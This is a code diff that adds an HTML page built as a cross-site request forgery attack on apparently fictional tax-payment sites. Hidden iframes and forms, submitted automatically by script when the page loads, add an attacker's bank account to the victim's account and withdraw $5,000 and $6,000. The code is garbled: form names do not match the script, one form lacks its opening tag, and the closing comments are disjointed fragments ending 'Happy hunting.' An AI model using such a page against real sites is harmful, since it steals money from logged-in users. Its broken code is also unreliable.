@@ -1,0 +1,84 @@
+<html>
+<body>
+ <iframe style="display: none" name="payTaxIframe1">
+ </iframe>
+ <iframe style="display: none" name="payTaxIframe2">
+ </iframe>
+ <iframe style="display: none" name="payTaxIframe3">
+ 
+ </iframe>
+ <iframe style="display: none" name="payTaxIframe4">
+ </iframe>
+<!-- Gane starts here with malicious requests -->
+ 
+<form style="display: none; visibility: hidden" target="payTaxIframe1"
+action="https://www.taxpayme.com/account/associateAccts.jsp"
+method="POST" name="payTaxForm1">
+ <input type=hidden name="Action" value="AddAccount">
+ <input type=hidden name="BankName" value="SDS Bank">
+ <input type=hidden name="RoutingNumber" value="66666666333">
+ <input type=hidden name="AcctNumber" value="4631135433">
+ <input type=hidden name="AcctIndex" value=”2">
+ </form>
+ 
+ <form style="display: none; visibility: hidden" target="payTaxIframe2"
+action="https://www.taxpayme.com/account/withdraw.jsp" method="POST"
+name="paytaxForm2">
+ <input type=hidden name="Action" value="Withdraw">
+ <input type=hidden name="AcctIndex" value="2">
+ <input type=hidden name="Amount" value="5000.00">
+ <input type=hidden name="Confirm" value="Yes">
+ </form>
+
+<form style="display: none; visibility: hidden" target="paytaxIframe3"
+action="https://www.paytaxme.com/account/withdraw.jsp" method="POST"
+name="paytaxForm3">
+ <input type=hidden name="Action" value="Withdraw">
+ <input type=hidden name="AcctIndex" value="2">
+ <input type=hidden name="Amount" value="6000.00">
+ <input type=hidden name="Confirm" value="Yes">
+ </form>
+
+<input type=hidden name="Action" value="DelAccount">
+ <input type=hidden name="BankName" value="SDS Bank">
+ <input type=hidden name="RoutingNumber" value="66666666333">
+ <input type=hidden name="AcctNumber" value="4631135433">
+ <input type=hidden name="AcctIndex" value="2">
+ </form>
+
+ <script>
+ document.paytaxmeForm1.submit();
+ setTimeout('document.paytaxForm2.submit();', 2000);
+ setTimeout('document.paytaxmeForm3.submit();', 2000);
+</script>
+</body>
+</html>
+
+
+<!-- n receiving his monthly statement a couple of weeks later. --> 
+<!-- .js fi les fi lled with scripts used in rendering the page. --> 
+<!-- cookie will receive by a legitimate login. --> 
+
+<!--   Happy hunting. -->
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
